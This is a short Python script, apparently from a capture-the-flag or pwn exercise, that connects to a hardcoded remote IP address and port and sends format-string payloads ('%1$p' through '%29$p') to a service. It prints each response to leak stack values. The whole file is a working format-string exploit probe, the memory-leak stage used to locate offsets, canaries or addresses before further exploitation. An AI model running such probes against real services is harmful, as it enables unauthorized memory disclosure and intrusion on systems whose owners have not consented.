import socket, time

def interact(payload):
    try:
        s = socket.create_connection(('144.79.188.39', 43642), timeout=3)
        buf = s.recv(4096)
        s.sendall(payload + b'\n')
        time.sleep(0.2)
        res = b''
        while True:
            try:
                data = s.recv(4096)
                if not data: break
                res += data
                if b'> ' in res: break
            except socket.timeout:
                break
        s.close()
        return res
    except Exception as e:
        return str(e).encode()

for i in range(1, 30):
    p = ('%' + str(i) + '$' + 'p').encode()
    r = interact(p)
    print(f'Pos {i}: {p} -> {repr(r)}')
